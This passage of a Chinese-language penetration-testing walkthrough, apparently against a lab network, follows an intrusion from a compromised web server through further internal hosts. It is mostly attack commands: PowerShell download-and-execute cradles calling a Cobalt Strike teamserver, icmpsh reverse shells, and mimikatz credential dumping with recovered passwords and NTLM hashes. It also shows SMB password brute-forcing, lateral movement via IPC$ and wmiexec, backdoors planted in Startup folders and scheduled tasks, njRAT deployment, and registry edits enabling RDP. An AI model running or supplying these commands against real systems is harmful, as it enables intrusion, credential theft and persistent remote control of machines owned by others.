</span><br></pre></td></tr></table></figure>\n<p>访问 <a href=\"http://www.moonsec123.com/2/2.jsp\">http://www.moonsec123.com/2/2.jsp</a> 还是不能出网。</p>\n<h2 id=\"4-11-cobalt-strike4-0-dns-上线\"><a href=\"#4-11-cobalt-strike4-0-dns-上线\" class=\"headerlink\" title=\"4.11. cobalt strike4.0 dns 上线\"></a>4.11. cobalt strike4.0 dns 上线</h2><p>目前防火墙 只允许 icmp 协议和 dns 协议出站。在 cs 里面内置了一个 dns 上线 模块，很合适当前的环境。</p>\n<p><img src=\"LzfD0j7y8pB9NuD2Rp6JjEZ_bTCd27un2Cygwjrue5g.png\" alt=\"image\"></p>\n<p>准备一个域名设置 ns 记录和 A 记</p>\n<p><img src=\"_mYaUFT0DV7hXxpi70NF_SzSBNQAXyKkllbvgkLQ7uo.png\" alt=\"image\"></p>\n<p>在外网的 vps 里面装 kali 把 teamserver 执行即可。 </p>\n<p>使用 nohup 执行放再后台允许。 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">nohup</span> ./teamserver 108.160.130.114 QWEasd55aa &amp;</span><br></pre></td></tr></table></figure>\n<p>设置监听器</p>\n<p><img src=\"_bOtx9Q9vqHRHRIyh_xGFEmkk-KE9mnqthZ5V4BC3s4.png\" alt=\"image\"></p>\n<p>生成利用脚本</p>\n<p><img src=\"jdNGZwkssQg1G3c0pRIxe7z_EzaQyho_R3Klh6shmww.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">powershell.exe -nop -w hidden -c <span class=\"string\">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://108.160.130.114:80/dns&#x27;))&quot;</span> </span><br></pre></td></tr></table></figure>\n<p>这条命令执行即可 但是当前环境是不出网的把 dns 保存下来放在本地下载执 行。 能出网的情况下\\</p>\n<p><img src=\"WRr7tEgQU7UZ5Ki66B17hQg974XzKd-jDRJZ3h7re1Q.png\" alt=\"image\"></p>\n<p><img src=\"doApA6HssXuNVXgC-H1KMCc7OQsfDVEc5vFZr8RB8Zw.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">powershell.exe -nop -w hidden -c <span class=\"string\">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://127.0.0.1/dns/dns&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"L3J6tuyktrBA_LqoGJxBghZuTP_Me-ZlRR_RP_EE8gU.png\" alt=\"image\"></p>\n<p>这里执行完还没有上线，是因为当前主机连接不上外网。Icmp 可以出去 但是也 不能连上网络。</p>\n<p>ICMP 协议反弹 shell</p>\n<p>主机是可以使用 ping 所以支持 icmp 协议出网</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Icmpsh 这个攻击可以用 icmp反弹 shell</span><br><span class=\"line\">项目地址：https://github.com/inquisb/icmpsh</span><br><span class=\"line\">先关闭自身的 icmp</span><br><span class=\"line\">sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br><span class=\"line\">编译c文件</span><br></pre></td></tr></table></figure>\n<p><img src=\"4UPDsvjgEErbZKXqwCvI3tV6y0vRDRQwFfcQuZXvqHY.png\" alt=\"image\"></p>\n<p>192.168.8.133 是 vps 或者攻击者的 ip</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./qq 192.168.8.133 192.168.22.130</span><br></pre></td></tr></table></figure>\n<p><img src=\"Lh2VYw5NYA_82OLLNtkwoAc_wOkMXTcjujVqNIyoJqM.png\" alt=\"image\"></p>\n<p>目标上执行 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">icmpsh.exe -t 192.16.8.133</span><br></pre></td></tr></table></figure>\n<p><img src=\"Gn8t_2JCFZugRn5crqgE3dr2zJUgrUxB_zJLAgh6Pjc.png\" alt=\"image\"></p>\n<p>上线成功</p>\n<p><img src=\"m2ekrLuIZoa27-CREeq2aO9OsiimCYpKBZgr78Lw0UQ.png\" alt=\"image\"></p>\n<p> </p>\n<h2 id=\"4-1312SERVER2-信息收集整\"><a href=\"#4-1312SERVER2-信息收集整\" class=\"headerlink\" title=\"4.1312SERVER2 信息收集整\"></a>4.1312SERVER2 信息收集整</h2><p>网站后台密码</p>\n<p>Behinder 连接不上数据库 采用备份导出 SQL 查看密码。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;C:\\Program Files\\MySQL\\MySQL Server 5.5\\bin\\mysqldump.exe&quot;</span> -uroot -pzzzmoonsec javapmsv14 tq_user &gt;C:/<span class=\"variable\">$Recycle</span>.Bin/user.sql</span><br></pre></td></tr></table></figure>\n<p><img src=\"ALDcqe_cbER955bCLah12C5t2chvhP24swwX6FpZgf8.png\" alt=\"image\"></p>\n<p> </p>\n<p><img src=\"tBI9OHa20Ae-pB3YBub6AGYNCExCRnvdzr4-NHflCBk.png\" alt=\"image\"></p>\n<table>\n<thead>\n<tr>\n<th>账号</th>\n<th>密文</th>\n<th>明文</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>admin</td>\n<td>ef05a5b18a007a35480af439a149c90e</td>\n<td>123moonsec</td>\n</tr>\n</tbody></table>\n<p>Mysql 数据库账号和密码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"> jdbc.url=jdbc:mysql://127.0.0.1:3306/javapmsv14?characterEncoding=utf8</span><br><span class=\"line\"> jdbc.username=root </span><br><span class=\"line\">jdbc.password=zzzmoonsec</span><br></pre></td></tr></table></figure>\n<p>Mimikatz 获取超级管理员 hash 明文获取</p>\n<p>上传 mimikatz</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe <span class=\"string\">&quot;&quot;</span>privilege::debug<span class=\"string\">&quot;&quot;</span> <span class=\"string\">&quot;&quot;</span>sekurlsa::logonpasswords full<span class=\"string\">&quot;&quot;</span> <span class=\"built_in\">exit</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"iN0moycMIPYhSQbfrDVSDoh30DCqpXTodUK8_aUS4es.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">671a2ad216fe3ae83e864f0eabfba056 解密的</span><br></pre></td></tr></table></figure>\n<p><img src=\"oYVnJmETDir_6McMf_28a9NJfpDM1FOGeWngF4LDg7Q.png\" alt=\"image\"></p>\n<p> </p>\n<table>\n<thead>\n<tr>\n<th>账号</th>\n<th>NTML</th>\n<th>明文</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Administrator</td>\n<td>671a2ad216fe3ae83e864f0eabfba056</td>\n<td>QWEasd123456</td>\n</tr>\n</tbody></table>\n<p> </p>\n<h2 id=\"4-14获取-ie-浏览器密码\"><a href=\"#4-14获取-ie-浏览器密码\" class=\"headerlink\" title=\"4.14获取 ie 浏览器密码\"></a>4.14获取 ie 浏览器密码</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]</span><br><span class=\"line\"><span class=\"variable\">$vault</span> = New-Object Windows.Security.Credentials.PasswordVault</span><br><span class=\"line\"><span class=\"variable\">$vault</span>.RetrieveAll() | % &#123; <span class=\"variable\">$_</span>.RetrievePassword();<span class=\"variable\">$_</span> &#125; | <span class=\"keyword\">select</span> username,resource,password</span><br></pre></td></tr></table></figure>\n<p><img src=\"WG2XG5OIoYpooR1YS7NSmDFKkyMj5nQrocgv8-6shNk.png\" alt=\"image\"></p>\n<p>保存在服务器上 powershell 执行 但是目标不存在密码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">powershell -nop -<span class=\"built_in\">exec</span> bypass -c <span class=\"string\">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://localhost/1/11.ps1&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"oPEusrQDqovAPTFG-reOPL122FGjH2XekAve8dpoKY0.png\" alt=\"image\"></p>\n<h1 id=\"5-内网横向移动\"><a href=\"#5-内网横向移动\" class=\"headerlink\" title=\"5.内网横向移动\"></a>5.内网横向移动</h1><h2 id=\"5-1内网-IPC-弱口令穷举\"><a href=\"#5-1内网-IPC-弱口令穷举\" class=\"headerlink\" title=\"5.1内网 IPC 弱口令穷举\"></a>5.1内网 IPC 弱口令穷举</h2><p>内网有个很强的扫描神器名叫 Ladon 项目地址 <a href=\"https://github.com/k8gege/Ladon\">https://github.com/k8gege/Ladon</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">打包上传到目标用 rar 解压</span><br><span class=\"line\"><span class=\"string\">&quot;C:/Program Files/WinRAR/Rar.exe&quot;</span> x C:/1/Ladon.rar</span><br><span class=\"line\">被解压到目录下：</span><br><span class=\"line\">C:/1/icmp/Ladon-master/</span><br><span class=\"line\">运行：</span><br><span class=\"line\">C:\\1\\icmp\\Ladon-master\\Ladon.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"udSzhaOREaL7dVJBjkfY_mbrTZE1xT67hCgVl3SQ6mI.png\" alt=\"image\"></p>\n<p>扫描在线主机：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\1\\icmp\\Ladon-master\\Ladon.exe 192.168.22.8/24 OnlinePC</span><br></pre></td></tr></table></figure>\n<p><img src=\"pwo3yHhkRXMfHcMrzj0ONj0rNYbZ8keuSb6-stxzF2w.png\" alt=\"image\"></p>\n<p>扫描445端口</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\1\\icmp\\Ladon-master\\Ladon.exe 192.168.22.8/24 PortScan 445</span><br></pre></td></tr></table></figure>\n<p><img src=\"TZptklHbnpSqUkBH5F9FD8zz6vgzeu3mmo10FP5f4mU.png\" alt=\"image\"></p>\n<p>扫描 ipc 弱口令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\1\\icmp\\Ladon-master\\Ladon.exe 192.168.22.8/24 smbscan</span><br></pre></td></tr></table></figure>\n<p><img src=\"n3A07Xn0sMdgC__6Cjt3k9UEaWcuRKyU-7OuBK7O2Po.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\1\\icmp\\Ladon-master\\Ladon.exe 192.168.22.131 smbscan</span><br></pre></td></tr></table></figure>\n<p><img src=\"7siuvHq7GZ6sVNP6oRRsL8Zc7m32vyfbnjuxzA2Pt3s.png\" alt=\"image\"></p>\n<h2 id=\"5-2IPC-建立连接执行命令\"><a href=\"#5-2IPC-建立连接执行命令\" class=\"headerlink\" title=\"5.2IPC 建立连接执行命令\"></a>5.2IPC 建立连接执行命令</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">建立连接 net use \\\\192.168.22.131\\ipc$ <span class=\"string\">&quot;QWEasd123&quot;</span> /user:<span class=\"string\">&quot;localhost\\administrator&quot;</span> </span><br><span class=\"line\">访问权限 <span class=\"built_in\">dir</span> \\\\192.168.22.131\\c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"pYnTjNTXLue-3ovmzKAh9xLPghOaQXAJpbm4DEMN-WU.png\" alt=\"image\"></p>\n<h2 id=\"5-3Ladon-wmiexec-执行命令\"><a href=\"#5-3Ladon-wmiexec-执行命令\" class=\"headerlink\" title=\"5.3Ladon wmiexec 执行命令\"></a>5.3Ladon wmiexec 执行命令</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\1\\icmp\\Ladon-master\\Ladon.exe wmiexec 192.168.22.131 administrator QWEasd123 <span class=\"built_in\">whoami</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"5zQoQIzB20r23tkMZXQ7-w3Qo1qFJYcTsbH-cR_X370.png\" alt=\"image\"></p>\n<p>5.4获取防火墙服务器权限</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\1\\icmp\\Ladon-master\\Ladon.exe 192.168.22.131 OnlinePC</span><br><span class=\"line\">C:\\1\\icmp\\Ladon-master\\Ladon.exe 192.168.22.128 OnlinePC</span><br></pre></td></tr></table></figure>\n<p><img src=\"fZ3QWtFXq1QyKTXZpJPmssHNbPFJuL3KI-ws0PXR0oo.png\" alt=\"image\"></p>\n<p>192.168.22.128 是网关 12server2 的流量走这个通道出去。</p>\n<p>192.168.22.128 也是开放 445 端口 但是弱口令扫描工具出错。</p>\n<p>使用搜集的密码逐条建立 ipc 连接。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.22.128\\ipc$ <span class=\"string\">&quot;QWEasd123456&quot;</span> /user:<span class=\"string\">&quot;localhost\\administrator&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">dir</span> \\\\192.168.22.128\\c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"GFuVwF2WUWTvYQyERIP5mhJZx6ckVY4EQBOrCbDl5T4.png\" alt=\"image\"></p>\n<p>获取权限了。 </p>\n<p>copy 后门到防火墙启动目录下。如果想马上执行 可以使用 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">SCHTASKS /Create /S 192.168.22.128 /U .\\Administrator /P <span class=\"string\">&quot;QWEasd123456&quot;</span> /SC ONCE /ST 20:15 /TN test1 /TR c:\\artifact.exe /RU system </span><br></pre></td></tr></table></figure>\n<p>但是当前环境不合适这种模式。因为出错 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">copy artifact.exe \\\\192.168.22.128\\C$\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\&quot;Start Menu<span class=\"string\">&quot;\\Programs\\Startup</span></span><br></pre></td></tr></table></figure>\n<p>成功复制 等待服务器重启即可 结果还是上不线。</p>\n<h3 id=\"5-4-1Icmp-反弹得到权限\"><a href=\"#5-4-1Icmp-反弹得到权限\" class=\"headerlink\" title=\"5.4.1Icmp 反弹得到权限\"></a>5.4.1Icmp 反弹得到权限</h3><p>创建一个1.bat的文件</p>\n<p>内容为：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">c:/icmpsh.exe -t 192.168.8.133</span><br></pre></td></tr></table></figure>\n<p><img src=\"NF99NaAHUx8pdINvp_N5Je_m-CHP2lSDY7USQtkUoPM.png\" alt=\"image\"></p>\n<p>复制icmpsh.exe到192.168.22.128的c盘</p>\n<p>copy icmpsh.exe \\\\192.168.22.128\\c$ </p>\n<p>添加1.bat到开机启动项</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">copy 1.bat \\\\192.168.22.128\\C$\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\&quot;Start Menu<span class=\"string\">&quot;\\Programs\\Startup\\1.bat</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"CbfSOQ_xtwZj6_HA3mVIjOn5lFtm2Oqyk83tLR0oiGk.png\" alt=\"image\"></p>\n<p>开始监听：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./qq 192.168.8.133 192.168.22.128</span><br></pre></td></tr></table></figure>\n<p><img src=\"uSaJm6wT3GdRQHLGU2egw6iyhopBdzBgICdFpfIQmtw.png\" alt=\"image\"></p>\n<p>重启一下，等待上线（一直出现“E”，是因为有两个shell上线了）</p>\n<p><img src=\"9Wh4uFmKW0c80dNgTgfCJg8VM-ysLJcXW5HdRVwiISY.png\" alt=\"image\"></p>\n<p>开启远程终端（使用第一条命令重启后生效，第二条命令直接生效）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\System32\\wbem\\wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting <span class=\"built_in\">where</span> (__CLASS != <span class=\"string\">&quot;&quot;</span>) call setallowtsconnections </span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\System32\\wbem\\wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting <span class=\"built_in\">where</span> (TerminalName =<span class=\"string\">&#x27;RDP-Tcp&#x27;</span>) call setuserauthenticationrequired 1</span><br></pre></td></tr></table></figure>\n<p>马上重启</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">shutdown -r -f</span><br></pre></td></tr></table></figure>\n<p><img src=\"8SqsS6o2kR9dv9O4F7oibK8UlTVfDKKlxwaVdo1ArCk.png\" alt=\"image\"></p>\n<p>成功开启3389</p>\n<p><img src=\"s8dD_lGObluEmvxaqDd9-qbU706QsuFifyQfzBYlDHo.png\" alt=\"image\"></p>\n<p>但是nmap扫描不到，应该是被过滤了，所以这里就算开启了3389也没有办法连接</p>\n<p><img src=\"xXad-JJtZPkVZf9DqcUwbOOMfeI0hHpUaiTQTxKlAvs.png\" alt=\"image\"></p>\n<p>进行内网扫描</p>\n<p>上传一份字典到ladon下，并且改名为：pass.txt，然后进行内网爆破445端口</p>\n<p> </p>\n<p><img src=\"zshSGzf6bDjk8kDtLEhw2pp6-1YS_jjJtep6FcJ9Zzg.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\1\\icmp\\Ladon-master\\Ladon.exe 192.168.22.131 smbscan</span><br></pre></td></tr></table></figure>\n<p><img src=\"7siuvHq7GZ6sVNP6oRRsL8Zc7m32vyfbnjuxzA2Pt3s.png\" alt=\"image\"></p>\n<h2 id=\"5-5-连接-33389-登录-12server4\"><a href=\"#5-5-连接-33389-登录-12server4\" class=\"headerlink\" title=\"5.5. 连接 33389 登录 12server4\"></a>5.5. 连接 33389 登录 12server4</h2><p>知道密码之后，就可以开启远程连接了</p>\n<p><img src=\"Zc0JSHzvjdIcRKd3Bx83xKmo3xRRhv8aIBcnU0YwvKM.png\" alt=\"image\"></p>\n<h2 id=\"5-6-横行渗透第第二层网络\"><a href=\"#5-6-横行渗透第第二层网络\" class=\"headerlink\" title=\"5.6. 横行渗透第第二层网络\"></a>5.6. 横行渗透第第二层网络</h2><p>在这台服务器上发现存在 vpn 连接 拨入连接</p>\n<p>信息收集</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">arp -a</span><br></pre></td></tr></table></figure>\n<p><img src=\"-aWC9imV9R-diSXH66zJRRp-ahdhTsuTkdFXIvhu7lM.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net view</span><br></pre></td></tr></table></figure>\n<p><img src=\"SIzJ-n3smX2n4DDxn2NYmKqncAI4rcb6M0lUmGpDcDE.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ping 03server3</span><br></pre></td></tr></table></figure>\n<p><img src=\"v-HycAmmnn-wTvQEBbV8U96PbuFRay5UwMb694y50Yg.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">dir</span> \\\\03server3\\c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"VsPfEY9JwnyJLusHHhDPodHmOLGALatnRYVOTFHJxT4.png\" alt=\"image\"></p>\n<h2 id=\"5-7配置远控-njRAT-v0-7d\"><a href=\"#5-7配置远控-njRAT-v0-7d\" class=\"headerlink\" title=\"5.7配置远控 njRAT v0.7d\"></a>5.7配置远控 njRAT v0.7d</h2><p>njRAT 是一款红队的著名的远控 支持多种平台使用。 反向连接的 ip 和端口</p>\n<p>生成木马：Server11.exe</p>\n<p><img src=\"F69_r4LKgX8neAmmgJp6oQ5bp-Fp4Cwc1dSzZCGcklc.png\" alt=\"image\"></p>\n<h2 id=\"5-8-获取-vpn-服务器权限\"><a href=\"#5-8-获取-vpn-服务器权限\" class=\"headerlink\" title=\"5.8. 获取 vpn 服务器权限\"></a>5.8. 获取 vpn 服务器权限</h2><p>生成木马之后，copy复制过去</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">copy Server11.exe \\\\03server3\\c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"pAI1Oz5w6Ph9QoV67PcT3TYd61vgp3Nd-SnFv4o7ALU.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net time \\\\03server3看一下时间</span><br><span class=\"line\">at \\\\192.168.22.132 0:30:00 c:/Server11.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"qPjVQgI4kl_PldG-WG2QtOSH3MkRWzaBT8KGDMD6QnM.png\" alt=\"image\"></p>\n<p>查看端口的开放</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Netstat -ano</span><br></pre></td></tr></table></figure>\n<p><img src=\"3I086uA-6GiJxFj4Yy_ZOvemuuaLDfAI2XNyx1-QHes.png\" alt=\"image\"></p>\n<p>查看一下操作系统</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"XqUmJtYgpQ-tTZpFXkcH2iRWCqH8_bFC63kftCzJB-A.png\" alt=\"image\"></p>\n<p>主机信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systeminfo</span><br></pre></td></tr></table></figure>\n<p><img src=\"0iZu2BffPohyp-p1mz-hCh6_gFKZznvENvM72EhTvWs.png\" alt=\"image\"></p>\n<p>第三层网络</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">arp-a</span><br></pre></td></tr></table></figure>\n<p><img src=\"Il4eUZurYoyczpCMFupW_PUnl1YdwJPHG4iyZKRRCT8.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net view</span><br></pre></td></tr></table></figure>\n<p><img src=\"YkTVt1101eTe7g93Ye0wm6vocPn8lOjymW1jRs7xpuk.png\" alt=\"image\"></p>\n<p>尝试连接VPN看看，能不能通信</p>\n<h3 id=\"5-8-1-开启-3389-远程终端\"><a href=\"#5-8-1-开启-3389-远程终端\" class=\"headerlink\" title=\"5.8.1. 开启 3389 远程终端\"></a>5.8.1. 开启 3389 远程终端</h3><p>Wmic 开启 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wmic path win32_terminalservicesetting <span class=\"built_in\">where</span> (__CLASS != <span class=\"string\">&quot;&quot;</span>) call setallowtsconnections 1</span><br></pre></td></tr></table></figure>\n<h3 id=\"5-8-2注册表开启3389\"><a href=\"#5-8-2注册表开启3389\" class=\"headerlink\" title=\"5.8.2注册表开启3389\"></a>5.8.2注册表开启3389</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">reg add <span class=\"string\">&quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>\n<p><img src=\"rormLBLA1MvMXn8B7uW7Jdx-em-e4njDqiwJDcNQh9A.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Netstat -ano查看</span><br></pre></td></tr></table></figure>\n<p><img src=\"Gz9TgBTAz5kjh419tsTVhF6V1ZCF8SMuT9mz4JOCMZY.png\" alt=\"image\"></p>\n<p>尝试连接：192.168.22.132</p>\n<h3 id=\"5-8-3-终端远程连接-vpn-服务器拿下\"><a href=\"#5-8-3-终端远程连接-vpn-服务器拿下\" class=\"headerlink\" title=\"5.8.3. 终端远程连接 vpn 服务器拿下\"></a>5.8.3. 终端远程连接 vpn 服务器拿下</h3><h2 id=\"5-9-VPN-服务器信息\"><a href=\"#5-9-VPN-服务器信息\" class=\"headerlink\" title=\"5.9.VPN 服务器信息\"></a>5.9.VPN 服务器信息</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">arp -a</span><br></pre></td></tr></table></figure>\n<p><img src=\"C5yw-o-Bwq18fshkTRD-mgbuucOtFTtpXdWqb-_Ln4E.png\" alt=\"image\"></p>\n<p>信息收集</p>\n<p>查看服务器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net start</span><br></pre></td></tr></table></figure>\n<p><img src=\"BPt3dnfdRGOHiJXNLtzhPqoOFUWFZ4DEzIXPcJymCiw.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net user</span><br></pre></td></tr></table></figure>\n<p><img src=\"sDl8-URqg55QG-_ZykP6PgcIys7RqXSrDtkYEs-MmxI.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">tasklist</span><br></pre></td></tr></table></figure>\n<p><img src=\"OTwvypv2WU7zrlR26JgBVAwvqTQDOqWgU6C_qYQYSqg.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ipconfig</span><br></pre></td></tr></table></figure>\n\n\n<p><img src=\"mTyMua-ngL54GOfLsF07YkEeUMDfH3YiIQaFDPl9pm0.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">03server3</span><br><span class=\"line\">61.100.100.129</span><br><span class=\"line\">192.168.22.132</span><br></pre></td></tr></table></figure>\n<h3 id=\"5-9-1-开放服务-DNS\"><a href=\"#5-9-1-开放服务-DNS\" class=\"headerlink\" title=\"5.9.1. 开放服务 DNS\"></a>5.9.1. 开放服务 DNS</h3><p>Dns发现两个域名</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Blue.com  61.100.100.129</span><br><span class=\"line\">Moonteam.com 61.100.100.100</span><br></pre></td></tr></table></figure>\n<p><img src=\"uKryrtmJttNqEkKISi0Oajxa2D0V4kmcKJXbbKnV7gI.png\" alt=\"image\"></p>\n<p>知道了dns还有pop3</p>\n<h3 id=\"5-9-2-POP3-服务开启\"><a href=\"#5-9-2-POP3-服务开启\" class=\"headerlink\" title=\"5.9.2. POP3 服务开启\"></a>5.9.2. POP3 服务开启</h3><h3 id=\"5-9-3-邮箱密码获取\"><a href=\"#5-9-3-邮箱密码获取\" class=\"headerlink\" title=\"5.9.3. 邮箱密码获取\"></a>5.9.3. 邮箱密码获取</h3><p>使用工具获取pop3密码</p>\n<p><img src=\"6ghl_WOVlvXXVH_VI_uSXyjxNcgUCpBEiyX4q3yQ5D8.png\" alt=\"image\"></p>\n<h3 id=\"5-9-4mimikatz获取明文密码\"><a href=\"#5-9-4mimikatz获取明文密码\" class=\"headerlink\" title=\"5.9.4mimikatz获取明文密码\"></a>5.9.4mimikatz获取明文密码</h3><p>Mimikatz 系统密码哈希</p>\n<p>上传 x86 mimikatz 获取明文 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug </span><br><span class=\"line\">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>\n<p><img src=\"4aL3BrfZnJQpgm1UOmqlsXmbIIPeN64-0Ez_tZo2Mwg.png\" alt=\"image\"></p>\n<h2 id=\"5-10-查看邮件服务\"><a href=\"#5-10-查看邮件服务\" class=\"headerlink\" title=\"5.10. 查看邮件服务\"></a>5.10. 查看邮件服务</h2><p>nslookup查看信息</p>\n<p><img src=\"8thyTGfMpxrnNkWLVXj5OYSmB5mW9sZmwpCArk9PT0U.png\" alt=\"image\"></p>\n<p>访问<a href=\"https://mail.moonteam.com/\">https://mail.moonteam.com</a></p>\n<p> </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Nbscand -r 61.100.100.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"1_O-dKXiTYD5xAi_S2RU17fh83-TlOtwkl5svAzAEQg.png\" alt=\"image\"></p>\n<p><img src=\"O0CbfywPHy08dv1bsxmuuj4EMjFiWH8lGqQSm5xohKQ.png\" alt=\"image\"></p>\n<h2 id=\"5-11-Exchange-信息收集\"><a href=\"#5-11-Exchange-信息收集\" class=\"headerlink\" title=\"5.11. Exchange 信息收集\"></a>5.11. Exchange 信息收集</h2><p>从查看网页源代码查看邮件服务器的版本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">owa/auth/15.0.1076/ </span><br><span class=\"line\">exchange 2013 CU</span><br></pre></td></tr></table></figure>\n<p><img src=\"qsR0FwRd6n6lBfUAhTEpC9hhJtvsCflpLlKGy-qHbmY.png\" alt=\"image\"></p>\n<h2 id=\"5-12-Ew-与-SocksCap64-设置-socks5-代理访问内网\"><a href=\"#5-12-Ew-与-SocksCap64-设置-socks5-代理访问内网\" class=\"headerlink\" title=\"5.12.Ew 与 SocksCap64 设置 socks5 代理访问内网\"></a>5.12.Ew 与 SocksCap64 设置 socks5 代理访问内网</h2><p>因为 2003 很多工具都不支持使用 特别是 powershell 和 net4.0 都不能安装所以设置代理在 12server4 测试安全。 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ew_for_Win -s ssocksd -l 7788</span><br></pre></td></tr></table></figure>\n<p><img 